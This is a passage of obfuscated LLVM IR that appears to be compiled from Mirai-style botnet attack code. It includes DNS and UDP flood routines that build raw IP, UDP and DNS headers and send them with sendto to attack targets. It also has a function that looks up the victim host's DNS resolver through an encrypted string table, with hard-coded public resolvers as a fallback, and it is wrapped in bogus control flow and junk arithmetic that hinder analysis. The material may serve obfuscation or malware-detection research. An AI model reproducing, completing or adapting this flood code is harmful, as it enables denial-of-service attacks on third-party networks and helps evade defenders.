  %_26 = shl i8 %650, -16
  %_27 = sub i8 0, %650
  %gen28 = add i8 %_27, -16
  %_29 = sub i8 0, %650
  %gen30 = add i8 %_29, -16
  %651 = and i8 %650, -16
  %_31 = shl i8 %651, 5
  %_32 = sub i8 0, %651
  %gen33 = add i8 %_32, 5
  %652 = or i8 %651, 5
  store i8 %652, i8* %649, align 4
  %653 = load i8, i8* %12, align 1
  %654 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %655 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %654, i32 0, i32 1
  store i8 %653, i8* %655, align 1
  %656 = load i8, i8* %19, align 1
  %657 = zext i8 %656 to i64
  %_34 = sub i64 41, %657
  %gen35 = mul i64 %_34, %657
  %_36 = sub i64 41, %657
  %gen37 = mul i64 %_36, %657
  %_38 = sub i64 0, 41
  %gen39 = add i64 %_38, %657
  %_40 = sub i64 0, 41
  %gen41 = add i64 %_40, %657
  %658 = add i64 41, %657
  %_42 = sub i64 0, %658
  %gen43 = add i64 %_42, 2
  %_44 = shl i64 %658, 2
  %_45 = sub i64 0, %658
  %gen46 = add i64 %_45, 2
  %659 = add i64 %658, 2
  %660 = load i32, i32* %21, align 4
  %661 = sext i32 %660 to i64
  %_47 = sub i64 %659, %661
  %gen48 = mul i64 %_47, %661
  %_49 = sub i64 0, %659
  %gen50 = add i64 %_49, %661
  %_51 = sub i64 %659, %661
  %gen52 = mul i64 %_51, %661
  %662 = add i64 %659, %661
  %_53 = sub i64 %662, 4
  %gen54 = mul i64 %_53, 4
  %663 = add i64 %662, 4
  %664 = trunc i64 %663 to i16
  %665 = call zeroext i16 @htons(i16 zeroext %664) #7
  %666 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %667 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %666, i32 0, i32 2
  store i16 %665, i16* %667, align 2
  %668 = load i16, i16* %13, align 2
  %669 = call zeroext i16 @htons(i16 zeroext %668) #7
  %670 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i32 0, i32 3
  store i16 %669, i16* %671, align 4
  %672 = load i8, i8* %14, align 1
  %673 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %674 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %673, i32 0, i32 5
  store i8 %672, i8* %674, align 4
  %675 = load i8, i8* %15, align 1
  %676 = icmp ne i8 %675, 0
  br label %originalBB10

originalBB58alteredBB:                            ; preds = %originalBB58, %224
  %677 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %678 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %677, i32 0, i32 6
  store i8 17, i8* %678, align 1
  %679 = load i32, i32* @LOCAL_ADDR, align 4
  %680 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %681 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %680, i32 0, i32 8
  store i32 %679, i32* %681, align 4
  %682 = load i32, i32* %22, align 4
  %683 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %684 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %683, i32 0, i32 9
  store i32 %682, i32* %684, align 4
  %685 = load i16, i16* %16, align 2
  %686 = call zeroext i16 @htons(i16 zeroext %685) #7
  %687 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %688 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %687, i32 0, i32 0
  store i16 %686, i16* %688, align 2
  %689 = load i16, i16* %17, align 2
  %690 = call zeroext i16 @htons(i16 zeroext %689) #7
  %691 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %692 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %691, i32 0, i32 1
  store i16 %690, i16* %692, align 2
  %693 = load i8, i8* %19, align 1
  %694 = zext i8 %693 to i64
  %_59 = sub i64 0, 21
  %gen60 = add i64 %_59, %694
  %_61 = sub i64 0, 21
  %gen62 = add i64 %_61, %694
  %695 = add i64 21, %694
  %_63 = sub i64 %695, 2
  %gen64 = mul i64 %_63, 2
  %_65 = sub i64 0, %695
  %gen66 = add i64 %_65, 2
  %_67 = sub i64 %695, 2
  %gen68 = mul i64 %_67, 2
  %696 = add i64 %695, 2
  %697 = load i32, i32* %21, align 4
  %698 = sext i32 %697 to i64
  %_69 = sub i64 %696, %698
  %gen70 = mul i64 %_69, %698
  %_71 = sub i64 %696, %698
  %gen72 = mul i64 %_71, %698
  %_73 = sub i64 0, %696
  %gen74 = add i64 %_73, %698
  %_75 = sub i64 0, %696
  %gen76 = add i64 %_75, %698
  %_77 = sub i64 %696, %698
  %gen78 = mul i64 %_77, %698
  %_79 = shl i64 %696, %698
  %_80 = sub i64 0, %696
  %gen81 = add i64 %_80, %698
  %699 = add i64 %696, %698
  %_82 = sub i64 0, %699
  %gen83 = add i64 %_82, 4
  %_84 = sub i64 0, %699
  %gen85 = add i64 %_84, 4
  %_86 = sub i64 %699, 4
  %gen87 = mul i64 %_86, 4
  %_88 = sub i64 0, %699
  %gen89 = add i64 %_88, 4
  %_90 = sub i64 0, %699
  %gen91 = add i64 %_90, 4
  %_92 = sub i64 0, %699
  %gen93 = add i64 %_92, 4
  %_94 = shl i64 %699, 4
  %700 = add i64 %699, 4
  %701 = trunc i64 %700 to i16
  %702 = call zeroext i16 @htons(i16 zeroext %701) #7
  %703 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %704 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %703, i32 0, i32 2
  store i16 %702, i16* %704, align 2
  %705 = load i16, i16* %18, align 2
  %706 = call zeroext i16 @htons(i16 zeroext %705) #7
  %707 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %708 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %707, i32 0, i32 0
  store i16 %706, i16* %708, align 2
  %709 = call zeroext i16 @htons(i16 zeroext 256) #7
  %710 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %711 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %710, i32 0, i32 1
  store i16 %709, i16* %711, align 2
  %712 = call zeroext i16 @htons(i16 zeroext 1) #7
  %713 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %714 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %713, i32 0, i32 2
  store i16 %712, i16* %714, align 2
  %715 = load i8, i8* %19, align 1
  %716 = load i8*, i8** %29, align 8
  %717 = getelementptr inbounds i8, i8* %716, i32 1
  store i8* %717, i8** %29, align 8
  store i8 %715, i8* %716, align 1
  %718 = load i8, i8* %19, align 1
  %719 = zext i8 %718 to i32
  %720 = load i8*, i8** %29, align 8
  %721 = sext i32 %719 to i64
  %722 = getelementptr inbounds i8, i8* %720, i64 %721
  store i8* %722, i8** %29, align 8
  %723 = load i8*, i8** %29, align 8
  store i8* %723, i8** %30, align 8
  %724 = load i8*, i8** %29, align 8
  %725 = getelementptr inbounds i8, i8* %724, i64 1
  %726 = load i8*, i8** %20, align 8
  %727 = load i32, i32* %21, align 4
  %_95 = sub i32 0, %727
  %gen96 = add i32 %_95, 1
  %_97 = shl i32 %727, 1
  %728 = add nsw i32 %727, 1
  call void @util_memcpy(i8* %725, i8* %726, i32 %728)
  store i32 0, i32* %23, align 4
  br label %originalBB58

originalBB101alteredBB:                           ; preds = %originalBB101, %293
  %729 = load i32, i32* %23, align 4
  %730 = load i32, i32* %21, align 4
  %731 = icmp slt i32 %729, %730
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %331
  %732 = load i8, i8* %24, align 1
  %_106 = shl i8 %732, 1
  %_107 = sub i8 %732, 1
  %gen108 = mul i8 %_107, 1
  %_109 = sub i8 0, %732
  %gen110 = add i8 %_109, 1
  %733 = add i8 %732, 1
  store i8 %733, i8* %24, align 1
  br label %originalBB105

originalBB114alteredBB:                           ; preds = %originalBB114, %369
  %734 = load i32, i32* %9, align 4
  %_115 = sub i32 %734, 1
  %gen116 = mul i32 %_115, 1
  %_117 = shl i32 %734, 1
  %735 = add nsw i32 %734, 1
  store i32 %735, i32* %9, align 4
  br label %originalBB114

originalBB121alteredBB:                           ; preds = %originalBB121, %389
  store i32 0, i32* %9, align 4
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %432
  %736 = call i32 @rand_next()
  %_126 = sub i32 %736, 65535
  %gen127 = mul i32 %_126, 65535
  %_128 = sub i32 %736, 65535
  %gen129 = mul i32 %_128, 65535
  %737 = and i32 %736, 65535
  %738 = trunc i32 %737 to i16
  %739 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %740 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %739, i32 0, i32 3
  store i16 %738, i16* %740, align 4
  br label %originalBB125

originalBB133alteredBB:                           ; preds = %originalBB133, %458
  %741 = call i32 @rand_next()
  %_134 = shl i32 %741, 65535
  %_135 = sub i32 %741, 65535
  %gen136 = mul i32 %_135, 65535
  %_137 = shl i32 %741, 65535
  %742 = and i32 %741, 65535
  %743 = trunc i32 %742 to i16
  %744 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %745 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %744, i32 0, i32 0
  store i16 %743, i16* %745, align 2
  br label %originalBB133

originalBB141alteredBB:                           ; preds = %originalBB141, %480
  %746 = load i16, i16* %17, align 2
  %747 = zext i16 %746 to i32
  %748 = icmp eq i32 %747, 65535
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %516
  %749 = load i8*, i8** %36, align 8
  %750 = load i8, i8* %19, align 1
  %751 = zext i8 %750 to i32
  call void @rand_alpha_str(i8* %749, i32 %751)
  %752 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %753 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %752, i32 0, i32 7
  store i16 0, i16* %753, align 2
  %754 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %755 = bitcast %struct.iphdr* %754 to i16*
  %756 = call zeroext i16 @checksum_generic(i16* %755, i32 20)
  %757 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %758 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %757, i32 0, i32 7
  store i16 %756, i16* %758, align 2
  %759 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %760 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %759, i32 0, i32 3
  store i16 0, i16* %760, align 2
  %761 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %762 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %763 = bitcast %struct.udphdr* %762 to i8*
  %764 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %765 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %764, i32 0, i32 2
  %766 = load i16, i16* %765, align 2
  %767 = load i8, i8* %19, align 1
  %768 = zext i8 %767 to i64
  %_146 = shl i64 21, %768
  %769 = add i64 21, %768
  %_147 = sub i64 0, %769
  %gen148 = add i64 %_147, 2
  %_149 = shl i64 %769, 2
  %_150 = sub i64 0, %769
  %gen151 = add i64 %_150, 2
  %_152 = sub i64 0, %769
  %gen153 = add i64 %_152, 2
  %_154 = shl i64 %769, 2
  %770 = add i64 %769, 2
  %771 = load i32, i32* %21, align 4
  %772 = sext i32 %771 to i64
  %_155 = sub i64 0, %770
  %gen156 = add i64 %_155, %772
  %_157 = shl i64 %770, %772
  %_158 = sub i64 %770, %772
  %gen159 = mul i64 %_158, %772
  %773 = add i64 %770, %772
  %_160 = sub i64 %773, 4
  %gen161 = mul i64 %_160, 4
  %_162 = sub i64 0, %773
  %gen163 = add i64 %_162, 4
  %_164 = sub i64 %773, 4
  %gen165 = mul i64 %_164, 4
  %_166 = shl i64 %773, 4
  %_167 = sub i64 0, %773
  %gen168 = add i64 %_167, 4
  %_169 = sub i64 %773, 4
  %gen170 = mul i64 %_169, 4
  %774 = add i64 %773, 4
  %775 = trunc i64 %774 to i32
  %776 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %761, i8* %763, i16 zeroext %766, i32 %775)
  %777 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %778 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %777, i32 0, i32 3
  store i16 %776, i16* %778, align 2
  %779 = load i32, i32* %22, align 4
  %780 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %781 = load i32, i32* %9, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %780, i64 %782
  %784 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %783, i32 0, i32 0
  %785 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %784, i32 0, i32 2
  %786 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %785, i32 0, i32 0
  store i32 %779, i32* %786, align 4
  %787 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %788 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %787, i32 0, i32 1
  %789 = load i16, i16* %788, align 2
  %790 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %791 = load i32, i32* %9, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %790, i64 %792
  %794 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %793, i32 0, i32 0
  %795 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %794, i32 0, i32 1
  store i16 %789, i16* %795, align 2
  %796 = load i32, i32* %10, align 4
  %797 = load i8*, i8** %32, align 8
  %798 = load i8, i8* %19, align 1
  %799 = zext i8 %798 to i64
  %_171 = shl i64 41, %799
  %800 = add i64 41, %799
  %_172 = sub i64 0, %800
  %gen173 = add i64 %_172, 2
  %_174 = sub i64 0, %800
  %gen175 = add i64 %_174, 2
  %_176 = sub i64 %800, 2
  %gen177 = mul i64 %_176, 2
  %_178 = shl i64 %800, 2
  %_179 = shl i64 %800, 2
  %801 = add i64 %800, 2
  %802 = load i32, i32* %21, align 4
  %803 = sext i32 %802 to i64
  %_180 = sub i64 %801, %803
  %gen181 = mul i64 %_180, %803
  %_182 = shl i64 %801, %803
  %804 = add i64 %801, %803
  %_183 = sub i64 %804, 4
  %gen184 = mul i64 %_183, 4
  %_185 = sub i64 %804, 4
  %gen186 = mul i64 %_185, 4
  %_187 = shl i64 %804, 4
  %805 = add i64 %804, 4
  %806 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %807 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %808 = load i32, i32* %9, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %807, i64 %809
  %811 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %810, i32 0, i32 0
  %812 = bitcast %struct.sockaddr_in* %811 to %struct.sockaddr*
  store %struct.sockaddr* %812, %struct.sockaddr** %806, align 8
  %813 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %814 = load %struct.sockaddr*, %struct.sockaddr** %813, align 8
  %815 = call i64 @sendto(i32 %796, i8* %797, i64 %805, i32 16384, %struct.sockaddr* %814, i32 16)
  br label %originalBB145

originalBB191alteredBB:                           ; preds = %originalBB191, %604
  br label %originalBB191
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %19 = call i8* @table_retrieve_val(i32 21, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 21)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.39
  %24 = load i32, i32* @y.40
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %191

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* %10, align 4
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %34 = call i64 @read(i32 %32, i8* %33, i64 2048)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @close(i32 %36)
  call void @table_unlock_val(i8 zeroext 22)
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %39 = load i32, i32* %11, align 4
  %40 = call i8* @table_retrieve_val(i32 22, i32* null)
  %41 = call i32 @util_stristr(i8* %38, i32 %39, i8* %40)
  store i32 %41, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %174

; <label>:44:                                     ; preds = %31
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %45 = load i32, i32* %12, align 4
  store i32 %45, i32* %14, align 4
  br label %46

; <label>:46:                                     ; preds = %148, %44
  %47 = load i32, i32* %14, align 4
  %48 = load i32, i32* %11, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %151

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* %14, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  store i8 %54, i8* %18, align 1
  %55 = load i8, i8* %16, align 1
  %56 = icmp ne i8 %55, 0
  br i1 %56, label %100, label %57

; <label>:57:                                     ; preds = %50
  %58 = load i8, i8* %18, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %65, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %18, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 9
  br i1 %64, label %65, label %82

; <label>:65:                                     ; preds = %61, %57
  %66 = load i32, i32* @x.39
  %67 = load i32, i32* @y.40
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %148

; <label>:82:                                     ; preds = %61
  store i8 1, i8* %16, align 1
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = load i32, i32* @x.39
  %85 = load i32, i32* @y.40
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* @x.39
  %93 = load i32, i32* @y.40
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %100

; <label>:100:                                    ; preds = %originalBBpart28, %50
  %101 = load i8, i8* %18, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 46
  br i1 %103, label %104, label %128

; <label>:104:                                    ; preds = %100
  %105 = load i32, i32* @x.39
  %106 = load i32, i32* @y.40
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %104
  %113 = load i8, i8* %18, align 1
  %114 = sext i8 %113 to i32
  %115 = icmp slt i32 %114, 48
  %116 = load i32, i32* @x.39
  %117 = load i32, i32* @y.40
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %115, label %133, label %124

; <label>:124:                                    ; preds = %originalBBpart212
  %125 = load i8, i8* %18, align 1
  %126 = sext i8 %125 to i32
  %127 = icmp sgt i32 %126, 57
  br i1 %127, label %133, label %128

; <label>:128:                                    ; preds = %124, %100
  %129 = load i32, i32* %14, align 4
  %130 = load i32, i32* %11, align 4
  %131 = sub nsw i32 %130, 1
  %132 = icmp eq i32 %129, %131
  br i1 %132, label %133, label %147

; <label>:133:                                    ; preds = %128, %124, %originalBBpart212
  %134 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %136 = load i32, i32* %12, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i32, i32* %14, align 4
  %140 = load i32, i32* %12, align 4
  %141 = sub nsw i32 %139, %140
  call void @util_memcpy(i8* %134, i8* %138, i32 %141)
  %142 = load i32, i32* %14, align 4
  %143 = load i32, i32* %12, align 4
  %144 = sub nsw i32 %142, %143
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %145
  store i8 0, i8* %146, align 1
  store i8 1, i8* %17, align 1
  br label %151

; <label>:147:                                    ; preds = %128
  br label %148

; <label>:148:                                    ; preds = %147, %originalBBpart24
  %149 = load i32, i32* %14, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %14, align 4
  br label %46

; <label>:151:                                    ; preds = %133, %46
  %152 = load i32, i32* @x.39
  %153 = load i32, i32* @y.40
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %151
  %160 = load i8, i8* %17, align 1
  %161 = icmp ne i8 %160, 0
  %162 = load i32, i32* @x.39
  %163 = load i32, i32* @y.40
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %161, label %170, label %173

; <label>:170:                                    ; preds = %originalBBpart216
  %171 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %172 = call i32 @inet_addr(i8* %171) #6
  store i32 %172, i32* %9, align 4
  br label %218

; <label>:173:                                    ; preds = %originalBBpart216
  br label %174

; <label>:174:                                    ; preds = %173, %31
  %175 = load i32, i32* @x.39
  %176 = load i32, i32* @y.40
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %174
  %183 = load i32, i32* @x.39
  %184 = load i32, i32* @y.40
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %191

; <label>:191:                                    ; preds = %originalBBpart220, %originalBBpart2
  %192 = call i32 @rand_next()
  %193 = urem i32 %192, 4
  switch i32 %193, label %218 [
    i32 0, label %194
    i32 1, label %196
    i32 2, label %198
    i32 3, label %200
  ]

; <label>:194:                                    ; preds = %191
  %195 = call i32 @htonl(i32 134744072) #7
  store i32 %195, i32* %9, align 4
  br label %218

; <label>:196:                                    ; preds = %191
  %197 = call i32 @htonl(i32 1246898730) #7
  store i32 %197, i32* %9, align 4
  br label %218

; <label>:198:                                    ; preds = %191
  %199 = call i32 @htonl(i32 1074151430) #7
  store i32 %199, i32* %9, align 4
  br label %218

; <label>:200:                                    ; preds = %191
  %201 = load i32, i32* @x.39
  %202 = load i32, i32* @y.40
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %200
  %209 = call i32 @htonl(i32 67240450) #7
  store i32 %209, i32* %9, align 4
  %210 = load i32, i32* @x.39
  %211 = load i32, i32* @y.40
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %218

; <label>:218:                                    ; preds = %originalBBpart224, %198, %196, %194, %191, %170
  %219 = load i32, i32* %9, align 4
  ret i32 %219

originalBBalteredBB:                              ; preds = %originalBB, %0
  %220 = alloca i32, align 4
  %221 = alloca i32, align 4
  %222 = alloca i32, align 4
  %223 = alloca i32, align 4
  %224 = alloca [2048 x i8], align 16
  %225 = alloca i32, align 4
  %226 = alloca [32 x i8], align 16
  %227 = alloca i8, align 1
  %228 = alloca i8, align 1
  %229 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %230 = call i8* @table_retrieve_val(i32 21, i32* null)
  %231 = call i32 (i8*, i32, ...) @open(i8* %230, i32 0)
  store i32 %231, i32* %221, align 4
  call void @table_lock_val(i8 zeroext 21)
  %232 = load i32, i32* %221, align 4
  %233 = icmp sge i32 %232, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %234 = load i8, i8* %18, align 1
  %235 = sext i8 %234 to i32
  %236 = icmp slt i32 %235, 48
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %151
  %237 = load i8, i8* %17, align 1
  %238 = icmp ne i8 %237, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %174
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %200
  %239 = call i32 @htonl(i32 67240450) #7
  store i32 %239, i32* %9, align 4
  br label %originalBB22
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
